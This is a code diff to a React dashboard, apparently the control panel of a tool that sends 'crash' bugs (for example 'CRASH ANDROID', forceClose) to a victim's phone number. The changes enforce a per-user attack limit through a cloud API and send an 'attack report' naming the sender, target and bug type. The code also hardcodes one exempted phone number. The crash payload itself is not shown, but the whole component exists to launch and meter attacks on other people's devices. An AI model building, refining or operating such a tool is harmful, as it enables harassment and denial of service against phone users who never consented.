@@ -38,7 +38,7 @@ export default function YaeMikoDashboard() {
     { name: "CRASH ANDROID", code: "forceClose", icon: <Bug className="w-10 h-10 text-orange-500" /> },
   ];
 
-  // --- FUNGSIONAL SYNC CLOUD VIA CONTROL API (FIXED ANTI CEKIK CACHE & ANTI UNLIMITED) ---
+  // --- FUNGSIONAL SYNC CLOUD VIA CONTROL API ---
   const syncWithCloud = async (action: 'get' | 'set' | 'sendReport', valueToSet?: number, messageText?: string) => {
     try {
       if (action === 'get') {
@@ -46,12 +46,14 @@ export default function YaeMikoDashboard() {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ action: 'get' }),
-          cache: 'no-store' // Wajib biar data beneran real-time dari database asli
+          cache: 'no-store'
         });
         const data = await res.json();
         
         if (data && data.ok) {
-          if (data.limit !== undefined) setBugLimit(data.limit);
+          // Hanya update limit dari database kalau user TIDAK sedang dalam proses mengirim bug
+          // Biar data di layar gak ketimpa data lama pas proses ngirim!
+          if (data.limit !== undefined && !isSending) setBugLimit(data.limit);
           if (data.locked !== undefined) setIsWebLocked(data.locked);
         }
       } else if (action === 'set' && valueToSet !== undefined) {
@@ -60,7 +62,6 @@ export default function YaeMikoDashboard() {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ action: 'set', valueToSet })
         });
-        setBugLimit(valueToSet);
       } else if (action === 'sendReport' && messageText) {
         await fetch('/api/control', {
           method: 'POST',
@@ -70,7 +71,6 @@ export default function YaeMikoDashboard() {
       }
     } catch (err) {
       console.error("Gagal sinkronisasi data cloud:", err);
-      // DOSA BESAR SANKSI LOCALSTORAGE KITA HAPUS BIAR GAK REFRESH ANGKA JADI 5 MULU!
     }
   };
 
@@ -83,13 +83,16 @@ export default function YaeMikoDashboard() {
     initData();
   }, []);
 
-  // REALTIME AUTO REFRESH: Diturunkan jadi 5 detik agar serverless function Vercel lo gak tabrakan/antre request
+  // REALTIME AUTO REFRESH
   useEffect(() => {
     const autoRefresh = setInterval(async () => {
-      await syncWithCloud('get');
-    }, 5000);
+      // Kalau lagi ngirim bug, stop auto-refresh sementara biar gak balapan data!
+      if (!isSending) {
+        await syncWithCloud('get');
+      }
+    }, 4000);
     return () => clearInterval(autoRefresh);
-  }, []);
+  }, [isSending]);
 
   // Live Counter Users
   useEffect(() => {
@@ -128,7 +131,8 @@ export default function YaeMikoDashboard() {
     }
   };
 
-  const handleSendBug = () => {
+  // --- LOGIKA BARU ANTI REFRESH UNLIMITED (SANGAT KETAT) ---
+  const handleSendBug = async () => {
     if (targetNumber === "6289505198913") { 
       setShowRestrictedOverlay(true); 
       return; 
@@ -139,19 +143,21 @@ export default function YaeMikoDashboard() {
       return; 
     }
     
+    // 1. Potong limit di layar LANGSUNG biar user free gak bisa spam klik!
+    const nextLimit = Math.max(0, bugLimit - 1);
+    setBugLimit(nextLimit);
     setIsSending(true);
+
     const delay = engineSpeed === "Instant" ? 1000 : engineSpeed === "Fast" ? 2500 : 4000;
+    const selectedBug = BUG_TYPES[activeNav].name;
     
+    // 2. Langsung set data limit terbaru ke DATABASE secepatnya tanpa nunggu delay selesai!
+    await syncWithCloud('set', nextLimit);
+
     setTimeout(async () => { 
       setIsSending(false); 
-      const nextLimit = Math.max(0, bugLimit - 1);
-      const selectedBug = BUG_TYPES[activeNav].name;
-
       const attackMsg = `🚀 *LAPORAN PENYERANGAN BUG*\n\n👤 *Pengirim:* ${username}\n🎯 *Target:* \`${targetNumber}\`\n👾 *Jenis Bug:* ${selectedBug}\n⚡ *Speed Engine:* ${engineSpeed}\n📉 *Sisa Limit User:* ${nextLimit}/5`;
       await syncWithCloud('sendReport', undefined, attackMsg);
-
-      // Kirim data limit terbaru langsung ke server database cloud
-      await syncWithCloud('set', nextLimit);
     }, delay);
   };
 
@@ -324,4 +330,4 @@ export default function YaeMikoDashboard() {
       `}</style>
     </div>
   )
-          }
+      }
